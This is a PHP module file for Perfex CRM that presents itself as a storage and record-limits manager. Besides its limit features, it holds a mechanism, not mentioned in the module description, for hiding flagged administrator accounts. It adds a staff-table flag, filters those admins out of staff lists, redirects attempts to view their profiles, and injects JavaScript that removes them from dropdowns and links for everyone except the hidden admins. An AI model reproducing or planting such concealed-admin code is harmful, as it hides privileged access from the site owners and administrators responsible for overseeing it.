<?php
defined('BASEPATH') or exit('No direct script access allowed');

/*
Module Name: Limit Setup
Description: Professional global record limits and storage limit management for Perfex CRM with reports, permissions, dashboard widget, audit logs, quota warnings and storage scans.
Version: 2.4.3
Author: System Limits Pro
Requires at least: 3.1.*
*/

define('SYSTEM_LIMITS_MODULE_NAME', 'system_limits');

register_activation_hook(SYSTEM_LIMITS_MODULE_NAME, 'system_limits_activate');
register_uninstall_hook(SYSTEM_LIMITS_MODULE_NAME, 'system_limits_uninstall');
if (function_exists('register_cron_task')) {
    register_cron_task('system_limits_cron_scan');
}

hooks()->add_action('pre_admin_init', 'system_limits_pre_admin_init');
hooks()->add_action('admin_init', 'system_limits_admin_init');
hooks()->add_action('app_init', 'system_limits_app_init');
hooks()->add_filter('staff_permissions', 'system_limits_filter_staff_permissions');
hooks()->add_action('after_clients_area_init', 'system_limits_clients_area_init');
hooks()->add_filter('before_init_media', 'system_limits_before_init_media');

// Hidden administrator privacy hooks
hooks()->add_filter('staff_table_sql_where', 'system_limits_hide_admin_staff_table_where');
hooks()->add_action('staff_member_edit_view_profile', 'system_limits_block_hidden_admin_direct_access');
hooks()->add_action('staff_profile_access', 'system_limits_block_hidden_admin_direct_access');
hooks()->add_action('app_admin_footer', 'system_limits_hidden_admin_footer_js');

register_language_files(SYSTEM_LIMITS_MODULE_NAME, [SYSTEM_LIMITS_MODULE_NAME]);


if (!function_exists('system_limits_index_exists')) {
    function system_limits_index_exists($table, $index)
    {
        $CI = &get_instance();
        $table = str_replace('`', '', $table);
        $index = str_replace('`', '', $index);

        try {
            $sql = "SELECT COUNT(1) AS c
                    FROM INFORMATION_SCHEMA.STATISTICS
                    WHERE TABLE_SCHEMA = DATABASE()
                      AND TABLE_NAME = " . $CI->db->escape($table) . "
                      AND INDEX_NAME = " . $CI->db->escape($index);
            $row = $CI->db->query($sql)->row();
            return !empty($row) && (int)$row->c > 0;
        } catch (Exception $e) {
            // Fail closed: if we cannot verify, do not attempt to create the index.
            log_message('error', 'System Limits index check failed for ' . $table . '.' . $index . ': ' . $e->getMessage());
            return true;
        } catch (Throwable $e) {
            log_message('error', 'System Limits index check failed for ' . $table . '.' . $index . ': ' . $e->getMessage());
            return true;
        }
    }
}

if (!function_exists('system_limits_add_index_if_missing')) {
    function system_limits_add_index_if_missing($table, $index, $columns)
    {
        $CI = &get_instance();
        $table = str_replace('`', '', $table);
        $index = str_replace('`', '', $index);

        if (!$CI->db->table_exists($table) || system_limits_index_exists($table, $index)) {
            return;
        }

        $previousDebug = isset($CI->db->db_debug) ? $CI->db->db_debug : false;
        $CI->db->db_debug = false;

        try {
            $CI->db->query('ALTER TABLE `' . $table . '` ADD INDEX `' . $index . '` (' . $columns . ')');
        } catch (Exception $e) {
            // MySQL duplicate index errors must never break module activation/admin pages.
            if (stripos($e->getMessage(), 'Duplicate key name') === false) {
                log_message('error', 'System Limits index creation skipped for ' . $table . '.' . $index . ': ' . $e->getMessage());
            }
        } catch (Throwable $e) {
            if (stripos($e->getMessage(), 'Duplicate key name') === false) {
                log_message('error', 'System Limits index creation skipped for ' . $table . '.' . $index . ': ' . $e->getMessage());
            }
        }

        $CI->db->db_debug = $previousDebug;
    }
}


function system_limits_activate()
{
    require_once(__DIR__ . '/install.php');
}

function system_limits_uninstall()
{
    // Keep historical storage tracking data by default. Only remove transient options if desired.
}

function system_limits_pre_admin_init()
{
    system_limits_ensure_schema();
}

function system_limits_app_init()
{
    system_limits_ensure_schema();
    $CI = &get_instance();
    $CI->load->helper(SYSTEM_LIMITS_MODULE_NAME . '/system_limits');
    system_limits_check_pending_uploads();
}

function system_limits_clients_area_init()
{
    system_limits_check_pending_uploads(true);
}

function system_limits_admin_init()
{
    $CI = &get_instance();
    $CI->load->helper(SYSTEM_LIMITS_MODULE_NAME . '/system_limits');
    $CI->lang->load('system_limits', 'english', false, true, module_dir_path(SYSTEM_LIMITS_MODULE_NAME, ''));

    system_limits_register_permissions();

    if (is_admin()) {
        $CI->app_menu->add_setup_menu_item('system-limits', [
            'slug' => 'system-limits',
            'name' => _l('system_limits_menu'),
            'href' => admin_url('system_limits'),
            'position' => 200,
        ]);
    }

    if (has_permission('system_limits', '', 'view_storage_reports') || is_admin()) {
        $CI->app_menu->add_sidebar_children_item('reports', [
            'slug' => 'storage-usage-report',
            'name' => _l('system_limits_report_menu'),
            'href' => admin_url('system_limits/report'),
            'position' => 99,
        ]);
    }

    require_once(module_dir_path(SYSTEM_LIMITS_MODULE_NAME, 'hooks/system_limits_hooks.php'));
    system_limits_register_record_hooks();
}


function system_limits_filter_staff_permissions($permissions)
{
    // These two management actions must never be assigned through roles.
    if (isset($permissions['system_limits']['capabilities'])) {
        unset($permissions['system_limits']['capabilities']['manage_storage_settings']);
        unset($permissions['system_limits']['capabilities']['manage_record_limits']);
    }
    return $permissions;
}

function system_limits_register_permissions()
{
    $capabilities = ['capabilities' => [
        // Manage Storage Settings and Manage System Record Limits are intentionally NOT registered
        // as role permissions. They are restricted to default Perfex administrators only.
        'view_storage_reports' => _l('system_limits_perm_view_reports'),
        'view_files' => _l('system_limits_perm_view_files'),
    ]];
    register_staff_capabilities('system_limits', $capabilities, _l('system_limits'));
}

function system_limits_before_init_media($opts)
{
    $CI = &get_instance();
    $CI->load->helper(SYSTEM_LIMITS_MODULE_NAME . '/system_limits');
    foreach ($opts['roots'] as &$root) {
        if (!isset($root['bind']) || !is_array($root['bind'])) { $root['bind'] = []; }
        $root['bind']['upload.presave'] = 'system_limits_elfinder_upload_presave';
        $root['bind']['rm'] = 'system_limits_elfinder_removed';
    }
    return $opts;
}

function system_limits_cron_scan()
{
    $CI = &get_instance();
    $CI->load->model('system_limits/System_limits_model', 'sl_model');
    $CI->sl_model->scan_storage_files();
    $CI->sl_model->scan_media_folder();
    $CI->sl_model->rebuild_usage_cache(true);
}

function system_limits_ensure_schema()
{
    if (!function_exists('db_prefix')) { return; }
    $CI = &get_instance();
    $CI->load->dbforge();

    $limits = db_prefix() . 'system_limits';
    if (!$CI->db->table_exists($limits)) {
        $CI->dbforge->add_field([
            'id' => ['type'=>'INT','constraint'=>11,'unsigned'=>true,'auto_increment'=>true],
            'resource' => ['type'=>'VARCHAR','constraint'=>50,'null'=>false],
            'limit_value' => ['type'=>'INT','constraint'=>11,'null'=>true],
            'is_enabled' => ['type'=>'TINYINT','constraint'=>1,'default'=>0],
            'updated_at' => ['type'=>'DATETIME','null'=>true],
        ]);
        $CI->dbforge->add_key('id', true); $CI->dbforge->add_key('resource');
        $CI->dbforge->create_table('system_limits', true);
    }

    $files = db_prefix() . 'system_storage_files';
    if (!$CI->db->table_exists($files)) {
        $CI->dbforge->add_field([
            'id' => ['type'=>'INT','constraint'=>11,'unsigned'=>true,'auto_increment'=>true],
            'staff_id' => ['type'=>'INT','constraint'=>11,'null'=>true],
            'client_id' => ['type'=>'INT','constraint'=>11,'null'=>true],
            'module_name' => ['type'=>'VARCHAR','constraint'=>80,'null'=>true],
            'related_id' => ['type'=>'INT','constraint'=>11,'null'=>true],
            'file_name' => ['type'=>'VARCHAR','constraint'=>255,'null'=>false],
            'file_path' => ['type'=>'TEXT','null'=>true],
            'file_type' => ['type'=>'VARCHAR','constraint'=>50,'null'=>true],
            'mime_type' => ['type'=>'VARCHAR','constraint'=>120,'null'=>true],
            'file_size' => ['type'=>'BIGINT','constraint'=>20,'default'=>0],
            'source_table' => ['type'=>'VARCHAR','constraint'=>80,'null'=>true],
            'source_id' => ['type'=>'INT','constraint'=>11,'null'=>true],
            'is_deleted' => ['type'=>'TINYINT','constraint'=>1,'default'=>0],
            'uploaded_at' => ['type'=>'DATETIME','null'=>true],
            'created_at' => ['type'=>'DATETIME','null'=>true],
            'updated_at' => ['type'=>'DATETIME','null'=>true],
        ]);
        $CI->dbforge->add_key('id', true); $CI->dbforge->add_key('staff_id'); $CI->dbforge->add_key('module_name');
        $CI->dbforge->create_table('system_storage_files', true);
    }

    $cache = db_prefix() . 'system_storage_usage_cache';
    if (!$CI->db->table_exists($cache)) {
        $CI->dbforge->add_field([
            'id' => ['type'=>'INT','constraint'=>11,'unsigned'=>true,'auto_increment'=>true],
            'staff_id' => ['type'=>'INT','constraint'=>11,'null'=>true],
            'module_name' => ['type'=>'VARCHAR','constraint'=>80,'null'=>true],
            'total_files' => ['type'=>'INT','constraint'=>11,'default'=>0],
            'total_size' => ['type'=>'BIGINT','constraint'=>20,'default'=>0],
            'last_upload_date' => ['type'=>'DATETIME','null'=>true],
            'largest_file' => ['type'=>'VARCHAR','constraint'=>255,'null'=>true],
            'largest_file_size' => ['type'=>'BIGINT','constraint'=>20,'default'=>0],
            'updated_at' => ['type'=>'DATETIME','null'=>true],
        ]);
        $CI->dbforge->add_key('id', true); $CI->dbforge->add_key('staff_id'); $CI->dbforge->add_key('module_name');
        $CI->dbforge->create_table('system_storage_usage_cache', true);
    }

    $notify = db_prefix() . 'system_notification_logs';
    if (!$CI->db->table_exists($notify)) {
        $CI->dbforge->add_field([
            'id' => ['type'=>'INT','constraint'=>11,'unsigned'=>true,'auto_increment'=>true],
            'event_key' => ['type'=>'VARCHAR','constraint'=>100,'null'=>false],
            'event_type' => ['type'=>'VARCHAR','constraint'=>80,'null'=>false],
            'recipient' => ['type'=>'VARCHAR','constraint'=>191,'null'=>true],
            'payload' => ['type'=>'TEXT','null'=>true],
            'created_at' => ['type'=>'DATETIME','null'=>true],
        ]);
        $CI->dbforge->add_key('id', true); $CI->dbforge->add_key('event_key');
        $CI->dbforge->create_table('system_notification_logs', true);
    }

    $audit = db_prefix() . 'system_limits_audit_logs';
    if (!$CI->db->table_exists($audit)) {
        $CI->dbforge->add_field([
            'id' => ['type'=>'INT','constraint'=>11,'unsigned'=>true,'auto_increment'=>true],
            'staff_id' => ['type'=>'INT','constraint'=>11,'null'=>true],
            'action' => ['type'=>'VARCHAR','constraint'=>100,'null'=>false],
            'description' => ['type'=>'TEXT','null'=>true],
            'metadata' => ['type'=>'TEXT','null'=>true],
            'created_at' => ['type'=>'DATETIME','null'=>true],
        ]);
        $CI->dbforge->add_key('id', true);
        $CI->dbforge->create_table('system_limits_audit_logs', true);
    }


    // Hidden administrator flag for provider/internal admin privacy.
    // Use raw SQL here instead of DB Forge add_column because some Perfex/CI
    // builds prefix table names differently during module activation.
    $staffTable = db_prefix() . 'staff';
    if ($CI->db->table_exists($staffTable) && !$CI->db->field_exists('is_system_hidden_admin', $staffTable)) {
        $CI->db->query('ALTER TABLE `' . $staffTable . '` ADD `is_system_hidden_admin` TINYINT(1) NOT NULL DEFAULT 0');
        system_limits_add_index_if_missing($staffTable, 'idx_system_hidden_admin', '`is_system_hidden_admin`');
    }

    // Performance indexes for storage/report queries. Add only if missing.
    system_limits_add_index_if_missing($files, 'idx_sl_staff_deleted_size', '`staff_id`,`is_deleted`,`file_size`');
    system_limits_add_index_if_missing($files, 'idx_sl_module_deleted_date', '`module_name`,`is_deleted`,`uploaded_at`');
    system_limits_add_index_if_missing($files, 'idx_sl_filetype_deleted', '`file_type`,`is_deleted`');
    system_limits_add_index_if_missing($files, 'idx_sl_source', '`source_table`,`source_id`');
    system_limits_add_index_if_missing($cache, 'idx_sl_cache_staff_module', '`staff_id`,`module_name`');

    $resources = ['leads','staff','customers','proposals','estimates','invoices','projects','tasks','media'];
    foreach ($resources as $r) {
        $CI->db->where('resource', $r);
        if (!$CI->db->get($limits)->row()) {
            $CI->db->insert($limits, ['resource'=>$r,'limit_value'=>null,'is_enabled'=>0,'updated_at'=>date('Y-m-d H:i:s')]);
        }
    }

    $defaults = [
        'system_limits_storage_enabled' => '0',
        'system_limits_storage_unit' => 'GB',
        'system_limits_storage_limit_bytes' => '5368709120',
        'system_limits_warning_threshold' => '80',
        'system_limits_restriction_behavior' => 'block',
        'system_limits_allowed_file_types' => '',
        'system_limits_max_single_file_bytes' => '0',
        'system_limits_max_single_file_unit' => 'MB',
        'system_limits_notify_email' => '',
        'system_limits_enable_email_alerts' => '1',
        'system_limits_critical_threshold' => '95',
        'system_limits_cache_enabled' => '1',
        'system_limits_hidden_admin_enabled' => '0',
        'system_limits_hidden_admin_ids' => '',
        'system_limits_hide_admin_staff_list' => '1',
        'system_limits_block_admin_direct_access' => '1',
        'system_limits_hide_admin_reports_filters' => '1',
        'system_limits_hide_admin_dropdowns' => '1',
    ];
    foreach ($defaults as $name => $value) {
        if (get_option($name) === false) { add_option($name, $value); }
    }
}


function system_limits_hidden_admin_ids()
{
    // IMPORTANT: this helper can be called while another report query is being
    // built. Do not use CI Query Builder here, otherwise it can pollute/reset
    // the outer SELECT/JOIN state and cause errors such as:
    // "Column 'staffid' in SELECT is ambiguous". Use raw SQL + static cache.
    static $cached = null;
    if ($cached !== null) { return $cached; }

    if (!function_exists('db_prefix')) { return []; }
    $ids = [];
    $opt = trim((string)get_option('system_limits_hidden_admin_ids'));
    if ($opt !== '') {
        foreach (explode(',', $opt) as $id) {
            $id = (int)trim($id);
            if ($id > 0) { $ids[$id] = $id; }
        }
    }

    $CI = &get_instance();
    $staffTable = db_prefix().'staff';
    if ($CI->db->table_exists($staffTable) && $CI->db->field_exists('is_system_hidden_admin', $staffTable)) {
        $rows = $CI->db->query('SELECT `' . $staffTable . '`.`staffid` AS staffid FROM `' . $staffTable . '` WHERE `' . $staffTable . '`.`is_system_hidden_admin` = 1')->result_array();
        foreach ($rows as $row) { $ids[(int)$row['staffid']] = (int)$row['staffid']; }
    }

    $cached = array_values($ids);
    return $cached;
}

function system_limits_is_hidden_admin($staff_id)
{
    return in_array((int)$staff_id, system_limits_hidden_admin_ids(), true);
}

function system_limits_current_user_can_view_hidden_admins()
{
    return is_staff_logged_in() && system_limits_is_hidden_admin(get_staff_user_id());
}

function system_limits_hidden_admin_privacy_enabled()
{
    return get_option('system_limits_hidden_admin_enabled') === '1';
}

function system_limits_hide_admin_staff_table_where($where)
{
    if (!system_limits_hidden_admin_privacy_enabled() || get_option('system_limits_hide_admin_staff_list') !== '1') { return $where; }
    if (system_limits_current_user_can_view_hidden_admins()) { return $where; }
    $CI = &get_instance();
    if (!$CI->db->field_exists('is_system_hidden_admin', db_prefix().'staff')) { return $where; }
    $where[] = 'AND ' . db_prefix() . 'staff.is_system_hidden_admin != 1';
    return $where;
}

function system_limits_block_hidden_admin_direct_access($staff_id)
{
    if (!system_limits_hidden_admin_privacy_enabled() || get_option('system_limits_block_admin_direct_access') !== '1') { return; }
    $staff_id = (int)$staff_id;
    if ($staff_id <= 0 || !system_limits_is_hidden_admin($staff_id) || system_limits_current_user_can_view_hidden_admins()) { return; }
    set_alert('warning', _l('system_limits_hidden_admin_access_denied'));
    redirect(admin_url('staff'));
    exit;
}

function system_limits_visible_staff_query()
{
    $CI = &get_instance();
    $CI->db->where('active', 1);
    if (system_limits_hidden_admin_privacy_enabled() && !system_limits_current_user_can_view_hidden_admins()) {
        if ($CI->db->field_exists('is_system_hidden_admin', db_prefix().'staff')) {
            $CI->db->where('is_system_hidden_admin !=', 1);
        }
    }
    return $CI->db->select(db_prefix().'staff.staffid, '.db_prefix().'staff.firstname, '.db_prefix().'staff.lastname, '.db_prefix().'staff.email')->order_by(db_prefix().'staff.firstname', 'ASC')->get(db_prefix().'staff')->result_array();
}

function system_limits_hidden_admin_footer_js()
{
    if (!system_limits_hidden_admin_privacy_enabled() || get_option('system_limits_hide_admin_dropdowns') !== '1') { return; }
    if (system_limits_current_user_can_view_hidden_admins()) { return; }
    $ids = array_map('intval', system_limits_hidden_admin_ids());
    if (!$ids) { return; }
    $CI = &get_instance();
    $names = [];
    if ($CI->db->table_exists(db_prefix().'staff')) {
        $rows = $CI->db->select(db_prefix().'staff.staffid, '.db_prefix().'staff.firstname, '.db_prefix().'staff.lastname, '.db_prefix().'staff.email')->where_in(db_prefix().'staff.staffid', $ids)->get(db_prefix().'staff')->result_array();
        foreach ($rows as $r) {
            $names[] = strtolower(trim(($r['firstname'] ?? '').' '.($r['lastname'] ?? '')));
            $names[] = strtolower(trim((string)($r['email'] ?? '')));
        }
    }
    ?>
    <script>
    (function(){
        var hiddenAdminIds = <?php echo json_encode($ids); ?>.map(String);
        var hiddenAdminTokens = <?php echo json_encode(array_values(array_filter(array_unique($names)))); ?>;
        function isHiddenStaffValue(value){ return hiddenAdminIds.indexOf(String(value || '')) !== -1; }
        function looksHiddenByText(text){
            text = String(text || '').toLowerCase().trim();
            if(!text) return false;
            for(var i=0;i<hiddenAdminTokens.length;i++){
                var token = hiddenAdminTokens[i];
                if(token && text.indexOf(token) !== -1){ return true; }
            }
            return false;
        }
        function cleanHiddenAdminOptions(){
            try {
                document.querySelectorAll('select option').forEach(function(opt){
                    var val = opt.value || opt.getAttribute('data-staffid') || opt.getAttribute('data-id');
                    if (isHiddenStaffValue(val) || looksHiddenByText(opt.textContent)) {
                        var select = opt.parentNode;
                        if (select && String(select.value) === String(opt.value)) { select.value = ''; }
                        opt.remove();
                        if (select && window.jQuery) {
                            window.jQuery(select).trigger('change');
                            if (window.jQuery(select).data('selectpicker')) { window.jQuery(select).selectpicker('refresh'); }
                        }
                    }
                });
                hiddenAdminIds.forEach(function(id){
                    document.querySelectorAll('[data-staffid="'+id+'"],[data-id="'+id+'"],a[href*="/admin/staff/member/'+id+'"],a[href*="/admin/staff/profile/'+id+'"],a[href*="/admin/profile/'+id+'"]').forEach(function(el){
                        var item = el.closest('tr, li, .media, .staff-profile, .select2-results__option, .bootstrap-select .dropdown-menu li') || el;
                        item.style.display = 'none';
                        item.setAttribute('aria-hidden','true');
                    });
                    document.querySelectorAll('.select2-results__option, .dropdown-menu li, .bootstrap-select li').forEach(function(el){
                        if(looksHiddenByText(el.textContent)){ el.style.display='none'; el.setAttribute('aria-hidden','true'); }
                    });
                });
            } catch(e) {}
        }
        cleanHiddenAdminOptions();
        var timer = setInterval(cleanHiddenAdminOptions, 1000);
        setTimeout(function(){ clearInterval(timer); }, 30000);
        if (window.MutationObserver) {
            var observer = new MutationObserver(function(){ cleanHiddenAdminOptions(); });
            observer.observe(document.documentElement, {childList:true, subtree:true});
        }
        if (window.jQuery) {
            window.jQuery(document).on('select2:open select2:select shown.bs.select ajaxComplete app.form-submitted', function(){ setTimeout(cleanHiddenAdminOptions, 100); });
        }
    })();
    </script>
    <?php
}